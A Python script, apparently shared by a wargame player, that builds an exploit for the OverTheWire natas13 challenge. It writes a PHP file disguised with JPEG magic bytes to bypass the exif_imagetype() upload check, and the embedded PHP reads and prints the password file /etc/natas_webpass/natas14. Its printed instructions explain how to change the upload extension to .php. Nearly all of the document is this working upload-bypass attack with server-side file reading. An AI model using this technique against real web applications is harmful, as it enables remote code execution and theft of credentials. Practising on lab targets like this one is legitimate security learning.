#!/usr/bin/python
#script made by krn_bhargav
#This script not aim to truly disclose the solution of the natas13(overthewire) challenge public.
#I made this script to practice my scripting skills with the webapplication security.
import sys
from time import *

def createpayload(phpcode):
	payloadname = "natas13exploit.php"
	f = open(payloadname,"w")
	try:
		f.write("\xFF\xD8\xFF\xEE" + phpcode) # \xFF\xD8\xFF\xEE is the magic header to manipulate the uploading code that this is 
		print"\t\t\t[+]Write Successfull"
		print"Upload '%s' to natas13 website donot forget to change the extension of 'filename(inputmethod)'" % payloadname
		print"Use inspect element to change extension to jpeg to php."
		sleep(4)
		f.close()
	except Exception as e:
		print e	
def exploitmake():
	print "[*]Making the payload which bypass the exif_imagetype()"
	print "and retreive the password for next challenge."
	sleep(2)
	#php code to execute after uploading of payload to natas13 webform
	phpcode= '''<?php
	$filename = "/etc/natas_webpass/natas14"; #this file contain the password for natas14
	#now open this file
	$myfile = fopen($filename,"r");
	echo "Password of natas14 is :: ";
	while(!feof($myfile)){
		echo fgets($myfile) . "<br>";
	}
	?>

	'''
	createpayload(phpcode)
def help():
	print "\t\tScript made by krn_bhargav."
	sleep(4)
	print '''\tThis script not aim to truly disclose the solution of 
	natas13(overthewire) challenge.
	I made this script to practice my scripting and webapplication skills
	
	I truly recommend before execute this script ,kidly read it first
	how i proceed this challenge
	
	<note> Idea to clear this challenge write in README.md
	
	<procedure> This script simply create a payload(natas13exploit) to bypass the exif_imagetype() function of php.
	and retreive the password of next challenge.
	<usage> ./scriptname
	'''
	sleep(2)
	print "\t\t\tContact at insta krn_bhargav for more information."

#main driven code
if __name__ == "__main__":
	if len(sys.argv[0:]) == 1:
		help()
		exploitmake()
	else:
		print "Simply type the ./scriptname after set chmod permission."	
